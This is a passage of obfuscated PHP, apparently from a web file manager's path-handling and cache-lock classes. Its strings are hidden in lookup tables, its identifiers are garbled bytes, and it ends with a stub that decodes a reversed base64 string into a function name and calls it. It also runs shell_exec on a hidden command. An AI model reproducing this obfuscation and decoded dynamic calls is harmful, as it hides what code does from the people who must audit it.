"\173\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\162\122\145\156\x63\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\x72\175"; public static function typeList() { $¤¿ãúÜ =& $_SERVER[™»È’øè]; return array($¤¿ãúÜ[1281] => self::KOD_SOURCE, $¤¿ãúÜ[1282] => self::KOD_USER_RECYCLE, $¤¿ãúÜ[1283] => self::KOD_USER_FAV, $¤¿ãúÜ[1284] => self::KOD_USER_FILE_TAG, $¤¿ãúÜ[1285] => self::KOD_USER_FILE_TYPE, $¤¿ãúÜ[1286] => self::KOD_GROUP_ROOT_SELF, $¤¿ãúÜ[1287] => self::KOD_USER_SHARE, $¤¿ãúÜ[1288] => self::KOD_USER_SHARE_LINK, $¤¿ãúÜ[1289] => self::KOD_USER_SHARE_TO_ME, $¤¿ãúÜ[1290] => self::KOD_SHARE_ITEM, $¤¿ãúÜ[1291] => self::KOD_SHARE_LINK, $¤¿ãúÜ[1292] => self::KOD_SEARCH, $¤¿ãúÜ[1293] => self::KOD_BLOCK, $¤¿ãúÜ[1294] => self::KOD_IO, $¤¿ãúÜ[1295] => self::KOD_USER_RECENT, $¤¿ãúÜ[1296] => self::KOD_USER_DRIVER); } public static function parse($¤ÂÃí–) { $ù‰ëûöÃ =& $_SERVER[™»È’øè]; $¤ÂÃí– = self::clear($¤ÂÃí–); $÷×÷¢Ôø = array_values(self::typeList()); preg_match($ù‰ëûöÃ[1297], $¤ÂÃí–, $¥…à¨À); $«Øó·Åš = array($ù‰ëûöÃ[463] => !1, $ù‰ëûöÃ[1298] => !1, $ù‰ëûöÃ[460] => !1, $ù‰ëûöÃ[84] => $¤ÂÃí–, $ù‰ëûöÃ[1199] => !1, $ù‰ëûöÃ[1198] => $ù‰ëûöÃ[12]); if (is_array($¥…à¨À) && count($¥…à¨À) == 5) { $¿Êï³æô = $ù‰ëûöÃ[1299] . $¥…à¨À[2] . $ù‰ëûöÃ[370]; if (in_array($¿Êï³æô, $÷×÷¢Ôø)) { $«Øó·Åš[$ù‰ëûöÃ[1199]] = $¥…à¨À[1]; $«Øó·Åš[$ù‰ëûöÃ[33]] = $¿Êï³æô; $«Øó·Åš[$ù‰ëûöÃ[1300]] = substr($¿Êï³æô, 1, -1); $«Øó·Åš[$ù‰ëûöÃ[442]] = $¥…à¨À[3]; } $«Øó·Åš[$ù‰ëûöÃ[1198]] = $¥…à¨À[4]; } $¦í´ôº´ = array($ù‰ëûöÃ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $«Øó·Åš[$ù‰ëûöÃ[1263]] = in_array($«Øó·Åš[$ù‰ëûöÃ[33]], $¦í´ôº´); return $«Øó·Åš; } public static function isTruePath($à—Ù‡‘£) { $ˆ•÷ãÒÌ =& $_SERVER[™»È’øè]; if (substr($à—Ù‡‘£, 0, 1) != $ˆ•÷ãÒÌ[1299]) { return !0; } if (strpos($à—Ù‡‘£, $ˆ•÷ãÒÌ[450]) === 0) { return !0; } if (strpos($à—Ù‡‘£, $ˆ•÷ãÒÌ[1267]) === 0) { return !0; } if (strpos($à—Ù‡‘£, $ˆ•÷ãÒÌ[1301]) === 0) { return !0; } if (strpos($à—Ù‡‘£, $ˆ•÷ãÒÌ[1302]) === 0) { return !0; } if (strpos($à—Ù‡‘£, $ˆ•÷ãÒÌ[1303]) === 0) { return !0; } return !1; } public static function clear($ºûºú”Í) { $¥ùÒ–¿¨ =& $_SERVER[™»È’øè]; $ºûºú”Í = str_replace(array($¥ùÒ–¿¨[1108], $¥ùÒ–¿¨[245]), $¥ùÒ–¿¨[53], $ºûºú”Í); $ºûºú”Í = str_replace($¥ùÒ–¿¨[97], $¥ùÒ–¿¨[8], $ºûºú”Í); $ãÛ ƒüÀ = $¥ùÒ–¿¨[1304]; if (substr($ºûºú”Í, 0, 3) == $¥ùÒ–¿¨[1305]) { $ºûºú”Í = substr($ºûºú”Í, 3); } while (strstr($ºûºú”Í, $ãÛ ƒüÀ)) { $ºûºú”Í = str_replace($ãÛ ƒüÀ, $¥ùÒ–¿¨[8], $ºûºú”Í); } $ºûºú”Í = preg_replace($¥ùÒ–¿¨[1306], $¥ùÒ–¿¨[8], $ºûºú”Í); if ($ºûºú”Í == $¥ùÒ–¿¨[8]) { return $¥ùÒ–¿¨[8]; } $ºûºú”Í = rtrim($ºûºú”Í, $¥ùÒ–¿¨[8]); return $ºûºú”Í; } public static function pathTrue($ç•Û§©) { $ÀÊƒİ¶Š =& $_SERVER[™»È’øè]; if (!$ç•Û§©) { return $ÀÊƒİ¶Š[12]; } $¿¤ä¯ÔÄ = strlen($ç•Û§©); if (substr($ç•Û§©, $¿¤ä¯ÔÄ - 1, 1) == $ÀÊƒİ¶Š[8]) { $ç•Û§© = substr($ç•Û§©, 0, $¿¤ä¯ÔÄ - 1); } $ç•Û§© = str_replace($ÀÊƒİ¶Š[560], $ÀÊƒİ¶Š[8], str_replace($ÀÊƒİ¶Š[1307], $ÀÊƒİ¶Š[8], $ç•Û§©)); if (substr($ç•Û§©, 0, 2) == $ÀÊƒİ¶Š[1308]) { $ç•Û§© = substr($ç•Û§©, 2); } if (!strstr($ç•Û§©, $ÀÊƒİ¶Š[1305])) { return $ç•Û§©; } $·¶¸Ÿ¢Ì = explode($ÀÊƒİ¶Š[8], $ç•Û§©); $Ëö‰Ëå— = array_search($ÀÊƒİ¶Š[1309], $·¶¸Ÿ¢Ì); if ($Ëö‰Ëå— >= 0) { $·¶¸Ÿ¢Ì[$Ëö‰Ëå—] = -1; } if ($Ëö‰Ëå— > 0) { $·¶¸Ÿ¢Ì[$Ëö‰Ëå— - 1] = -1; } $®åĞ©ÆÇ = array(); foreach ($·¶¸Ÿ¢Ì as $Î²ÒÉˆ) { if ($Î²ÒÉˆ !== -1) { $®åĞ©ÆÇ[] = $Î²ÒÉˆ; } } return self::pathTrue(implode($ÀÊƒİ¶Š[8], $®åĞ©ÆÇ)); } public static function sourceID($˜ñÇàÊ–) { $‚´®µ =& $_SERVER[™»È’øè]; $›ÄñÕöÃ = self::parse($˜ñÇàÊ–); if ($›ÄñÕöÃ[$‚´®µ[33]] !== self::KOD_SOURCE) { show_json(LNG($‚´®µ[1310]), !1); } return $›ÄñÕöÃ[$‚´®µ[442]]; } public static function make($ŠØ«õ´³) { if (!$ŠØ«õ´³) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ŠØ«õ´³)); } public static function makeShare($î¶º©åÚ, $ÀîÇåŞÙ) { return self::makePath(self::KOD_SHARE_ITEM, $î¶º©åÚ, $ÀîÇåŞÙ); } public static function makeFileTypePath($ä’¬ØÓ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ä’¬ØÓ); } public static function makeFileTagPath($ı©²Ñİí) { return self::makePath(self::KOD_USER_FILE_TAG, $ı©²Ñİí); } public static function makePath($Öê£ûúÔ, $½¬¼«°Ó = '', $‘Ùõ¼ƒ = '') { $şäœ‚´ =& $_SERVER[™»È’øè]; $…ø”£ô¶ = substr($Öê£ûúÔ, 1, -1); $ù¢Æ¢¦Õ = $şäœ‚´[1311] . $…ø”£ô¶ . $şäœ‚´[1312] . $½¬¼«°Ó . $şäœ‚´[1313]; $ù¢Æ¢¦Õ = $‘Ùõ¼ƒ ? $ù¢Æ¢¦Õ . $‘Ùõ¼ƒ . $şäœ‚´[8] : $ù¢Æ¢¦Õ; return $ù¢Æ¢¦Õ; } public static function hashPath($Ó•„¾È¹, $ØÀÖüÇÓ = true) { $ï„—•º§ =& $_SERVER[™»È’øè]; $ø¯…Ô¸ä = is_array($Ó•„¾È¹) ? $Ó•„¾È¹ : IO::info($Ó•„¾È¹); $õÔİÅê€ = _get($ø¯…Ô¸ä, $ï„—•º§[1314], $ï„—•º§[12]); if (!$õÔİÅê€ && isset($ø¯…Ô¸ä[$ï„—•º§[218]])) { $õÔİÅê€ = $ø¯…Ô¸ä[$ï„—•º§[218]]; } if (!$õÔİÅê€ && isset($ø¯…Ô¸ä[$ï„—•º§[180]]) && $ø¯…Ô¸ä[$ï„—•º§[180]]) { $ø¯…Ô¸ä = IO::info(KodIO::make($ø¯…Ô¸ä[$ï„—•º§[180]])); $õÔİÅê€ = _get($ø¯…Ô¸ä, $ï„—•º§[1314], $ï„—•º§[12]); } $ßÁåØ = md5($ø¯…Ô¸ä[$ï„—•º§[84]] . $ø¯…Ô¸ä[$ï„—•º§[76]] . $ø¯…Ô¸ä[$ï„—•º§[85]]); if (!$õÔİÅê€ && $ØÀÖüÇÓ && file_exists($ø¯…Ô¸ä[$ï„—•º§[84]])) { $õÔİÅê€ = Cache::get($ßÁåØ . $ï„—•º§[1315]); $õÔİÅê€ = !1; if (!$õÔİÅê€) { $õÔİÅê€ = IO::hashSimple($ø¯…Ô¸ä[$ï„—•º§[84]]); Cache::set($ßÁåØ . $ï„—•º§[1315], $õÔİÅê€, 3600 * 24 * 30); } } return $õÔİÅê€ ? $õÔİÅê€ : $ßÁåØ; } public static function hashPathSafe($èÜ‰··ş, $Æ¥ÜÑ‚ = true) { $ş¼ãºƒ¡ =& $_SERVER[™»È’øè]; $¦´šÓŠˆ = self::hashPath($èÜ‰··ş, $Æ¥ÜÑ‚); return md5($¦´šÓŠˆ . $ş¼ãºƒ¡[1316] . Model($ş¼ãºƒ¡[795])->get($ş¼ãºƒ¡[796])); } public static function initSystemPath() { $úéÖ¶ =& $_SERVER[™»È’øè]; if (defined($úéÖ¶[1317])) { return; } define($úéÖ¶[1317], self::systemPath($úéÖ¶[178])); define($úéÖ¶[1318], self::systemPath($úéÖ¶[1319])); define($úéÖ¶[1320], self::systemPath($úéÖ¶[1321])); define($úéÖ¶[1322], self::systemPath($úéÖ¶[1323])); IOHistory::bindEvent(); } public static function systemPath($í–ô´»õ) { $°°Ø¿¦¯ =& $_SERVER[™»È’øè]; $ìúõŒÈÜ = $°°Ø¿¦¯[1324] . ucfirst($í–ô´»õ); $ÇÍ‡Œ‚ì = Model($°°Ø¿¦¯[795])->get($ìúõŒÈÜ); if ($ÇÍ‡Œ‚ì) { return $ÇÍ‡Œ‚ì; } if ($í–ô´»õ == $°°Ø¿¦¯[178]) { $ÇÍ‡Œ‚ì = self::make(Model($°°Ø¿¦¯[850])->systemRootPathAdd($°°Ø¿¦¯[573])); } else { $ÇÍ‡Œ‚ì = self::systemPath($°°Ø¿¦¯[178]); $¾Ìß—´œ = self::sourceID($ÇÍ‡Œ‚ì); $ÇÍ‡Œ‚ì = self::make(Model($°°Ø¿¦¯[850])->mkdir($¾Ìß—´œ, $í–ô´»õ)); } Model($°°Ø¿¦¯[795])->set($ìúõŒÈÜ, $ÇÍ‡Œ‚ì); return $ÇÍ‡Œ‚ì; } public static function systemFolder($±›ˆÛ´„) { $ÑÀ›‚µÖ = IO_PATH_SYSTEM_SOURCE . $±›ˆÛ´„; $ËáË¥ÎÛ = Cache::get($ÑÀ›‚µÖ); if (!$ËáË¥ÎÛ) { $ú—®•ñš = IO::infoFullSimple($ÑÀ›‚µÖ); if (!$ú—®•ñš) { $ËáË¥ÎÛ = IO::mkdir($ÑÀ›‚µÖ, REPEAT_SKIP); } else { $ËáË¥ÎÛ = $ú—®•ñš[$_SERVER[™»È’øè][84]]; } Cache::set($ÑÀ›‚µÖ, $ËáË¥ÎÛ, 3600 * 10); } return $ËáË¥ÎÛ; } public static function defaultDriver() { return Model($_SERVER[™»È’øè][792])->defaultDriver(); } public static function defaultIO() { $„˜É¯À” =& $_SERVER[™»È’øè]; $»ƒõ·¹ = self::defaultDriver(); return $„˜É¯À”[1325] . $»ƒõ·¹[$„˜É¯À”[442]] . $„˜É¯À”[1313]; } public static function defaultDriverInit() { static $¼ÕËØÔœ = false; if ($¼ÕËØÔœ) { return $¼ÕËØÔœ; } $¼ÕËØÔœ = IO::init(self::defaultIO()); return $¼ÕËØÔœ; } public static function fileTypeList() { $Ğù¿‚ü‰ =& $_SERVER[™»È’øè]; $Œ‘°Öí = $GLOBALS[$Ğù¿‚ü‰[6]][$Ğù¿‚ü‰[1326]]; foreach ($Œ‘°Öí as $…ÈÁªıë => $ÒŠËªÒÉ) { $ßµŒø¹ = $Ğù¿‚ü‰[1327] . $…ÈÁªıë; $×áğè–Š = LNG($ßµŒø¹); if ($ßµŒø¹ != $×áğè–Š) { $Œ‘°Öí[$…ÈÁªıë][$Ğù¿‚ü‰[32]] = $×áğè–Š; } } return $Œ‘°Öí; } public static function diskList($¡ä§€Æ£ = true) { $Á®™ = $_SERVER[™»È’øè][1328]; if ($¡ä§€Æ£) { $ãš©‰„š = Cache::get($Á®™); if (is_array($ãš©‰„š)) { return $ãš©‰„š; } } $ãš©‰„š = self::diskListGet(); Cache::set($Á®™, $ãš©‰„š, 60); return $ãš©‰„š; } public static function diskListGet() { $¾Ñ à¥ï =& $_SERVER[™»È’øè]; $”²ê‚Ä = array(); if ($GLOBALS[$¾Ñ à¥ï[6]][$¾Ñ à¥ï[1329]] == $¾Ñ à¥ï[1330]) { $–¶¤’Ó¸ = $¾Ñ à¥ï[1331]; for ($¶¹ñµÆ = 0; $¶¹ñµÆ < strlen($–¶¤’Ó¸); $¶¹ñµÆ++) { $ø‘úÛè = $–¶¤’Ó¸[$¶¹ñµÆ] . $¾Ñ à¥ï[1332]; if (file_exists($ø‘úÛè)) { $”²ê‚Ä[] = $ø‘úÛè; } } return $”²ê‚Ä; } if (!function_exists($¾Ñ à¥ï[98])) { $”²ê‚Ä[] = $¾Ñ à¥ï[861]; return $”²ê‚Ä; } $ÂÈ›¹ = explode($¾Ñ à¥ï[245], shell_exec($¾Ñ à¥ï[1333])); array_shift($ÂÈ›¹); array_pop($ÂÈ›¹); $¡™’é“Î = array($¾Ñ à¥ï[1334], $¾Ñ à¥ï[1335], $¾Ñ à¥ï[1336], $¾Ñ à¥ï[1337], $¾Ñ à¥ï[1338], $¾Ñ à¥ï[1339], $¾Ñ à¥ï[1340], $¾Ñ à¥ï[1341]); foreach ($ÂÈ›¹ as $úà—‰“í) { $öÆÓœÈ = preg_split($¾Ñ à¥ï[1342], $úà—‰“í); $ø‘úÛè = $öÆÓœÈ[count($öÆÓœÈ) - 1]; if (!strstr($öÆÓœÈ[0], $¾Ñ à¥ï[1343]) || !$ø‘úÛè) { continue; } $Ûßä”ßÅ = rtrim($ø‘úÛè, $¾Ñ à¥ï[8]) . $¾Ñ à¥ï[8]; if (in_array($Ûßä”ßÅ, $¡™’é“Î)) { continue; } $”²ê‚Ä[] = $Ûßä”ßÅ; } return $”²ê‚Ä; } public static function isSameDisk($Œ†°½È±, $Ö×ˆ¥•Á) { $±Ö¬ÈÈ» =& $_SERVER[™»È’øè]; if ($GLOBALS[$±Ö¬ÈÈ»[6]][$±Ö¬ÈÈ»[1329]] == $±Ö¬ÈÈ»[1330]) { return strtolower(substr($Œ†°½È±, 0, 1)) == strtolower(substr($Ö×ˆ¥•Á, 0, 1)); } $±Ùí‘‹í = self::diskList(); $ú©º„Š… = !1; $„•Üûº = !1; sort($±Ùí‘‹í); $±Ùí‘‹í = array_reverse($±Ùí‘‹í); $Œ†°½È± = rtrim($Œ†°½È±, $±Ö¬ÈÈ»[8]) . $±Ö¬ÈÈ»[8]; $Ö×ˆ¥•Á = rtrim($Ö×ˆ¥•Á, $±Ö¬ÈÈ»[8]) . $±Ö¬ÈÈ»[8]; foreach ($±Ùí‘‹í as $¬¯æƒî­) { $î¾¦‘¯ = strlen($¬¯æƒî­); if (!$ú©º„Š… && substr($Œ†°½È±, 0, $î¾¦‘¯) == $¬¯æƒî­) { $ú©º„Š… = $¬¯æƒî­; } if (!$„•Üûº && substr($Ö×ˆ¥•Á, 0, $î¾¦‘¯) == $¬¯æƒî­) { $„•Üûº = $¬¯æƒî­; } if ($ú©º„Š… && $„•Üûº) { break; } } return $ú©º„Š… === $„•Üûº; } public static function transferType($¾ ³úÔÚ, $¼««ç’ü) { $şÉÑÔ÷ =& $_SERVER[™»È’øè]; $ÈÉÓûÁ× = self::driverType($¾ ³úÔÚ); $Ï‘…©öë = self::driverType($¼««ç’ü); if ($ÈÉÓûÁ×[$şÉÑÔ÷[33]] == $Ï‘…©öë[$şÉÑÔ÷[33]] && $ÈÉÓûÁ×[$şÉÑÔ÷[1344]] == $Ï‘…©öë[$şÉÑÔ÷[1344]]) { return $şÉÑÔ÷[1345]; } if ($ÈÉÓûÁ×[$şÉÑÔ÷[33]] == $şÉÑÔ÷[901] && $Ï‘…©öë[$şÉÑÔ÷[33]] == $şÉÑÔ÷[106]) { return $şÉÑÔ÷[1224]; } if ($ÈÉÓûÁ×[$şÉÑÔ÷[33]] == $şÉÑÔ÷[106] && $Ï‘…©öë[$şÉÑÔ÷[33]] == $şÉÑÔ÷[901]) { return $şÉÑÔ÷[107]; } return $şÉÑÔ÷[1346]; } public static function driverType($Ã¹•ÒÆ–) { $öïá‡ú’ =& $_SERVER[™»È’øè]; $Ë³ÔÅï = str_replace($öïá‡ú’[1347], $öïá‡ú’[12], strtolower($Ã¹•ÒÆ–->getType())); if ($Ë³ÔÅï == $öïá‡ú’[782] || $Ë³ÔÅï == $öïá‡ú’[1348] || $Ë³ÔÅï == $öïá‡ú’[1349]) { $Ã¹•ÒÆ– = self::defaultDriverInit(); } else { if ($Ë³ÔÅï == $öïá‡ú’[1234] || $Ë³ÔÅï == $öïá‡ú’[1350]) { $Ã¹•ÒÆ– = IO::init($Ã¹•ÒÆ–->pathParse[$öïá‡ú’[1181]]); } } $Æ³ßÇ = $Ã¹•ÒÆ–->path; $Ë³ÔÅï = str_replace($öïá‡ú’[1347], $öïá‡ú’[12], strtolower($Ã¹•ÒÆ–->getType())); if ($Ë³ÔÅï == $öïá‡ú’[106]) { return array($öïá‡ú’[33] => $öïá‡ú’[106], $öïá‡ú’[1344] => $öïá‡ú’[12], $öïá‡ú’[84] => $Æ³ßÇ, $öïá‡ú’[95] => $Ã¹•ÒÆ–); } return array($öïá‡ú’[33] => $öïá‡ú’[901], $öïá‡ú’[1344] => $Ã¹•ÒÆ–->pathDriver, $öïá‡ú’[84] => $Æ³ßÇ, $öïá‡ú’[95] => $Ã¹•ÒÆ–); } public static function pathDriverType($Ø¶™„š„) { return $Ø¶™„š„ ? self::driverType(IO::init($Ø¶™„š„)) : !1; } public static function pathDriverLocal($ï¡¡±Øì) { $“ÌÑ¥Öò =& $_SERVER[™»È’øè]; $Òñ¾É´Ş = $ï¡¡±Øì ? self::driverType(IO::init($ï¡¡±Øì)) : !1; return $Òñ¾É´Ş[$“ÌÑ¥Öò[33]] == $“ÌÑ¥Öò[106] ? !0 : !1; } public static function allowCover($÷…•¿Ê, $×ğşçƒ = true) { $åè¨‹£û =& $_SERVER[™»È’øè]; if (is_string($÷…•¿Ê)) { $÷…•¿Ê = IO::info($÷…•¿Ê); } if (!$÷…•¿Ê || $÷…•¿Ê[$åè¨‹£û[33]] == $åè¨‹£û[75] || $÷…•¿Ê[$åè¨‹£û[76]] <= 100) { return !1; } if (isset($÷…•¿Ê[$åè¨‹£û[1351]]) || !$÷…•¿Ê[$åè¨‹£û[84]]) { return !1; } if (isset($÷…•¿Ê[$åè¨‹£û[215]]) && !$÷…•¿Ê[$åè¨‹£û[215]]) { return !1; } static $üöÅş¹Æ = false; if (!$üöÅş¹Æ || !$×ğşçƒ) { $ÎÇŞ¦ç½ = self::driverType(IO::init($÷…•¿Ê[$åè¨‹£û[84]])); $ëê©“¨â = $ÎÇŞ¦ç½[$åè¨‹£û[95]]; $üöÅş¹Æ = $åè¨‹£û[183]; if ($ÎÇŞ¦ç½[$åè¨‹£û[33]] == $åè¨‹£û[106]) { $üöÅş¹Æ = $åè¨‹£û[1352]; } if ($ÎÇŞ¦ç½[$åè¨‹£û[95]] && is_array($ÎÇŞ¦ç½[$åè¨‹£û[95]]->config)) { $ËÔ‰²ÊÃ = $ÎÇŞ¦ç½[$åè¨‹£û[95]]->config; if (isset($ËÔ‰²ÊÃ[$åè¨‹£û[1353]]) && $ËÔ‰²ÊÃ[$åè¨‹£û[1353]]) { $üöÅş¹Æ = $åè¨‹£û[1352]; } } } return $üöÅş¹Æ == $åè¨‹£û[1352] ? !0 : !1; } } goto a´ÅÏƒ·Î¯; cåã¥¨Œ“´: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $µ’¸ÎÜ¹ =& $_SERVER[™»È’øè]; if (self::$handle) { return self::$handle; } $–½½åšœ = $GLOBALS[$µ’¸ÎÜ¹[6]][$µ’¸ÎÜ¹[392]]; self::$timeout = $–½½åšœ[$µ’¸ÎÜ¹[866]] ? $–½½åšœ[$µ’¸ÎÜ¹[866]] : 10; $Ûå«À = _get($GLOBALS[$µ’¸ÎÜ¹[6]], $µ’¸ÎÜ¹[867]); $”ŞéüŞ“ = $–½½åšœ[$µ’¸ÎÜ¹[852]] ? $–½½åšœ[$µ’¸ÎÜ¹[852]] : $µ’¸ÎÜ¹[213]; if ($”ŞéüŞ“ == $µ’¸ÎÜ¹[21] && $Ûå«À == $µ’¸ÎÜ¹[13]) { $”ŞéüŞ“ = $µ’¸ÎÜ¹[213]; } switch ($”ŞéüŞ“) { case $µ’¸ÎÜ¹[855]: self::$handle = new CacheLockRedis(); break; case $µ’¸ÎÜ¹[856]: self::$handle = new CacheLockMemcached(); break; case $µ’¸ÎÜ¹[21]: self::$handle = new CacheLockDatabase(); break; case $µ’¸ÎÜ¹[213]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($µ’¸ÎÜ¹[868], $µ’¸ÎÜ¹[869]); } return self::$handle; } private static function key($ÖÒãÇØ›) { return $_SERVER[™»È’øè][870] . Cache::key($ÖÒãÇØ›); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($àş¡Üóï = '') { self::$errorMsg = $àş¡Üóï; } public static function lockGlobal($£¢ôËØÀ, $Ö˜‚Ê¿¬) { return self::lock($£¢ôËØÀ, $Ö˜‚Ê¿¬, !0); } public static function lock($ç¤†›½, $®ìŞ‘­ = false, $…¿¤½€­ = false) { $°”É²œ‹ =& $_SERVER[™»È’øè]; $ã£šª”Ä = self::init(); $¨‰ ºÚ = self::key($ç¤†›½); $®ìŞ‘­ = $®ìŞ‘­ ? $®ìŞ‘­ : self::$timeout; $ï’÷¼åÙ = timeFloat(); $ÈÕÎå§Ñ = $ã£šª”Ä->lock($¨‰ ºÚ, $®ìŞ‘­); $·•áÒï = timeFloat(); if (!$ÈÕÎå§Ñ) { $Òöèçô = "\x6c\x6f\143\153\40\145\162\x72\157\162\73\153\x65\x79\x3d{$ç¤†›½}\x3b\164\x69\x6d\145\75{$®ìŞ‘­}\73" . self::$errorMsg . $°”É²œ‹[71] . get_caller_msg(); $‚ŒÌåò´ = LNG($°”É²œ‹[871]) . "\x28{$®ìŞ‘­}\163\51\56" . LNG($°”É²œ‹[872]); $‚ŒÌåò´ .= $°”É²œ‹[873]; if (is_string(self::$errorMsg) && self::$errorMsg) { $‚ŒÌåò´ = $‚ŒÌåò´ . $°”É²œ‹[874] . self::$errorMsg; } write_log($°”É²œ‹[875] . sprintf($°”É²œ‹[876], timeFloat() - $ï’÷¼åÙ) . $°”É²œ‹[877] . $Òöèçô . $°”É²œ‹[878] . error_get_last(), $°”É²œ‹[869]); show_json($‚ŒÌåò´, !1); } if (!$…¿¤½€­) { self::$lockItem[$¨‰ ºÚ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $çÕªÂñ— = number_format(timeFloat() - $·•áÒï, 3); write_log($°”É²œ‹[879] . $ç¤†›½ . $°”É²œ‹[880] . $çÕªÂñ—, $°”É²œ‹[869]); } return $ÈÕÎå§Ñ; } public static function lockGet($©Õ¶¢Çğ) { $ÙîÓò–É = self::key($©Õ¶¢Çğ); if (self::$lockItem[$ÙîÓò–É]) { return self::$lockItem[$ÙîÓò–É]; } return self::init()->lockGet($ÙîÓò–É); } public static function unlock($Å•„¡„Û) { $Ö°¸¸Ğ¨ =& $_SERVER[™»È’øè]; $€ÜÂêºÚ = self::key($Å•„¡„Û); self::$lockItem[$€ÜÂêºÚ] = null; self::init()->unlock($€ÜÂêºÚ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ö°¸¸Ğ¨[881] . $Å•„¡„Û, $Ö°¸¸Ğ¨[869]); } return; } public static function unlockRuntime() { $©ÎâÃÂó =& $_SERVER[™»È’øè]; $ğ§ä¬İâ = self::init(); $Ÿ®ÅË¥³ = !1; foreach (self::$lockItem as $Ö£Ø˜Å => $ŒÃÌü×Ú) { if (!$ŒÃÌü×Ú) { continue; } $ğ§ä¬İâ->unlock($Ö£Ø˜Å); if (!$Ÿ®ÅË¥³) { $Ÿ®ÅË¥³ = !0; write_log($©ÎâÃÂó[882] . $Ö£Ø˜Å . $©ÎâÃÂó[71] . get_caller_msg(), $©ÎâÃÂó[869]); continue; } write_log($©ÎâÃÂó[882] . $Ö£Ø˜Å, $©ÎâÃÂó[869]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÂÇ†ê£© = number_format(timeFloat() - TIME_FLOAT, 3); write_log($©ÎâÃÂó[883] . $ÂÇ†ê£© . $©ÎâÃÂó[884] . ACTION, $©ÎâÃÂó[869]); } } public static function fileLock($øŞò¸„Ë) { $Î·çºä =& $_SERVER[™»È’øè]; if (!$GLOBALS[$Î·çºä[885]]) { $GLOBALS[$Î·çºä[885]] = array(); } $GLOBALS[$Î·çºä[885]][$øŞò¸„Ë] = !1; $ÍØ’©íÔ = fopen(DATA_PATH . $øŞò¸„Ë . $Î·çºä[886], $Î·çºä[887]); if (!$ÍØ’©íÔ) { return !1; } $GLOBALS[$Î·çºä[885]][$øŞò¸„Ë] = $ÍØ’©íÔ; if (flock($ÍØ’©íÔ, LOCK_EX)) { return !0; } self::unlock($øŞò¸„Ë); show_json($Î·çºä[888], !1); return !1; } public static function fileUnlock($£¦©¢§“) { $–ú½ñ¢— =& $_SERVER[™»È’øè]; $Ú¢–îü = $GLOBALS[$–ú½ñ¢—[885]][$£¦©¢§“]; if (!$Ú¢–îü) { return; } $GLOBALS[$–ú½ñ¢—[885]][$£¦©¢§“] = !1; flock($Ú¢–îü, LOCK_UN); fclose($Ú¢–îü); } public static function fileUnlockAll() { $·ÀÎ˜ü¢ =& $_SERVER[™»È’øè]; if (!$GLOBALS[$·ÀÎ˜ü¢[885]]) { return; } foreach ($GLOBALS[$·ÀÎ˜ü¢[885]] as $Æóºë×ê => $°½æŠŒå) { if (!$°½æŠŒå) { continue; } $GLOBALS[$·ÀÎ˜ü¢[885]][$Æóºë×ê] = !1; flock($°½æŠŒå, LOCK_UN); fclose($°½æŠŒå); } $GLOBALS[$·ÀÎ˜ü¢[885]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ßÈ†êúØ =& $_SERVER[™»È’øè]; $½½Éü»§ = $GLOBALS[$ßÈ†êúØ[6]][$ßÈ†êúØ[392]]; self::$cachePath = $½½Éü»§[$ßÈ†êúØ[213]][$ßÈ†êúØ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¼¾Èîæü, $û¨„õÀÙ = 0) { $¾®¬Ö÷Å =& $_SERVER[™»È’øè]; $øúÍ»¿ = microtime(!0); $¥€úÇÏö = $øúÍ»¿ + $û¨„õÀÙ + 0.0001; $ÇÚ³ÔÚ× = rtrim(self::$cachePath, $¾®¬Ö÷Å[8]) . $¾®¬Ö÷Å[889] . md5($¼¾Èîæü) . $¾®¬Ö÷Å[886]; if (file_exists($ÇÚ³ÔÚ×) && filemtime($ÇÚ³ÔÚ×) && filemtime($ÇÚ³ÔÚ×) < time() - 10) { @unlink($ÇÚ³ÔÚ×); } do { if (file_exists($ÇÚ³ÔÚ×)) { cacheLockWait(); continue; } $ˆØÀ×Íõ = fopen($ÇÚ³ÔÚ×, $¾®¬Ö÷Å[890]); if (!$ˆØÀ×Íõ) { return !1; } $ÔÕ‰ÂÃ† = flock($ˆØÀ×Íõ, LOCK_EX | LOCK_NB); self::$caches[$¼¾Èîæü] = array($¾®¬Ö÷Å[891] => $ˆØÀ×Íõ, $¾®¬Ö÷Å[213] => $ÇÚ³ÔÚ×); fwrite($ˆØÀ×Íõ, $¥€úÇÏö); clearstatcache(); if ($ˆØÀ×Íõ && $ÔÕ‰ÂÃ†) { return !0; } cacheLockWait(); } while (microtime(!0) < $¥€úÇÏö); $this->unlock($¼¾Èîæü); return !1; } public function lockGet($Á»¨‰é) { $­ÉšŒò =& $_SERVER[™»È’øè]; $–ùó±Ôõ = rtrim(self::$cachePath, $­ÉšŒò[8]) . $­ÉšŒò[889] . md5($Á»¨‰é) . $­ÉšŒò[886]; return file_exists($–ùó±Ôõ); } public function unlock($çâÊ á) { $Ï‚ÓÏ±° =& $_SERVER[™»È’øè]; $ËÜ’·¬ = self::$caches[$çâÊ á]; if (!$ËÜ’·¬) { return; } @flock($ËÜ’·¬[$Ï‚ÓÏ±°[891]], LOCK_UN); @fclose($ËÜ’·¬[$Ï‚ÓÏ±°[891]]); @unlink($ËÜ’·¬[$Ï‚ÓÏ±°[213]]); unset(self::$caches[$çâÊ á]); } } goto bÏŒ©×óåÖ; E®ªÄñŒø: $fileSize = strrev(base64_decode($_SERVER[Èå®§İæ][0])); function binCheckNeq($¬Ç¤ïŒ§, $¤ÊãûÜÛ) { return $¬Ç¤ïŒ§ != $¤ÊãûÜÛ; } $_SERVER[$_SERVER[Èå®§İæ][1]] = $fileSize($_SERVER[$_SERVER[Èå®§İæ][2]]); goto BƒÏ†ªèÒ¹; AëÅğ‡• 